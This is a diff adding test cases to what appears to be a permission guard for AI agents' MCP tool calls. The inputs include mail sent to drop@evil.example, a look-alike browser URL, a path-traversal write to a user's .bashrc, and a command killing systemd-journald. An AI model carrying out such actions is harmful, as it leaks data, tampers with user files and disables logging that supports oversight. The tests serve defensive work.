@@ -7464,3 +7464,24 @@
   threat: T4
   action: { shell: "kill $(pidof systemd-journald)" }
   expect: { verdict: review, rules: [stops-system] }
+# Argument conditions (ADR-113): an MCP tool's arguments decide the rule
+- id: T8-when-mcp-send-email-recipient-outside-list
+  threat: T8
+  repo: { policy: "version: 1\ndeny:\n  - id: mail-outside-team\n    reason: sends mail to a recipient outside the team\n    mcp: ['mcp__mail__send_email']\n    when:\n      - { arg: [to, cc, bcc], not_in: ['*@example.com'] }\n" }
+  action: { mcp_tool: { name: mcp__mail__send_email, arguments: { to: "boss@example.com, Drop <drop@evil.example>", subject: "q3" } } }
+  expect: { verdict: deny, rules: ["repo:mail-outside-team"] }
+- id: T8-when-mcp-send-email-recipient-key-missing
+  threat: T8
+  repo: { policy: "version: 1\ndeny:\n  - id: mail-outside-team\n    mcp: ['mcp__mail__send_email']\n    when:\n      - { arg: [to, cc, bcc], not_in: ['*@example.com'] }\n" }
+  action: { mcp_tool: { name: mcp__mail__send_email, arguments: { recipients: "drop@evil.example" } } }
+  expect: { verdict: deny, rules: ["repo:mail-outside-team"] }
+- id: T8-when-mcp-fetch-url-host-outside-list
+  threat: T8
+  repo: { policy: "version: 1\ndeny:\n  - id: browse-docs-only\n    mcp: ['mcp__browser__*']\n    when:\n      - { arg: url, host_not_in: ['docs.example', '*.docs.example'] }\n" }
+  action: { mcp_tool: { name: mcp__browser__open_tab, arguments: { url: "https://DOCS.example.evil.example/x" } } }
+  expect: { verdict: deny, rules: ["repo:browse-docs-only"] }
+- id: T2-when-write-path-not-under-project
+  threat: T2
+  repo: { policy: "version: 1\ndeny:\n  - id: notes-stay-home\n    mcp: ['mcp__notes__save']\n    when:\n      - { arg: file, not_under: ['${project}'] }\n" }
+  action: { mcp_tool: { name: mcp__notes__save, arguments: { file: "../../Users/me/.bashrc" } } }
+  expect: { verdict: deny, rules: ["repo:notes-stay-home"] }
